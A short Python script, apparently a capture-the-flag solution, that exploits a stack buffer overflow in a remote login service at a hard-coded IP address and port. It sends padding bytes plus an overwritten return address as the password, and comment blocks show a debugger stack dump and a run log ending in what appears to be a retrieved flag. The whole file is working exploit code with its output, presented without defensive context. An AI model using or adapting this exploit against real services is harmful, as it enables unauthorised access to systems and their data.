import socket
import struct

HOST = "104.131.90.29"
PORT = 8002

def pack(p):
    return struct.pack('<I', p)

payload = b'A'*32 + b'B'*16
payload += pack(0x08048530)

print(payload)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(sock.recv(1024))
    sock.sendall(b'a\n')
    print(sock.recv(1024))
    sock.sendall(payload + b'\n')
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.close()

main()

'''
0x7fffffffe510: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe520: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe530: 0x42424242      0x42424242      0x43434343      0x43434343
0x7fffffffe540: 0x44444444      0x44444444      0x0040000a      0x00000000

0x7fffffffe510: 0x00000a64      0x00000000      0x00000000      0x00000000
0x7fffffffe520: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe530: 0x004007b0      0x00000000      0x004005d0      0x00000001
0x7fffffffe540: 0xffffe550      0x00007fff      0x0040079f      0x00000000
'''

'''
Run: 
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB0\x85\x04\x08'
b'Username: '
b'Password: '
b'QJcKxJY6XyapWWRBnwOJQEYzS1BWSpbnnX2HpaPK6Sh1NLrXlbw2eyYo0Sja\n'
b''

'''